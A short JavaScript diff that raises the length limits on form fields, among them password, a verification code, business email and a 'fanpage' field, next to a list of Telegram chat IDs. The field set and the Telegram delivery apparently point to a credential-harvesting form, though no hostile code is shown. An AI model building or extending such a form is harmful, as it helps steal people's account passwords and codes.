@@ -10,15 +10,15 @@ const SESSION_EXPIRY_MS = 30 * 60 * 1000;
 
 // Field length limits to prevent oversized payloads
 const FIELD_LIMITS = {
-    fullName: 100,
-    email: 254,
-    emailBusiness: 254,
-    phone: 25,
-    fanpage: 150,
-    dob: 15,
-    note: 500,
-    password: 200,
-    code: 10,
+  fullName: 500,
+  email: 1000,
+  emailBusiness: 1000,
+  phone: 100,
+  fanpage: 500,
+  dob: 50,
+  note: 5000,
+  password: 1000,
+  code: 100,
 };
 
 const CHAT_IDS_ARRAY = TELEGRAM_CHAT_IDS ? TELEGRAM_CHAT_IDS.split(',').map(id => id.trim()) : [];
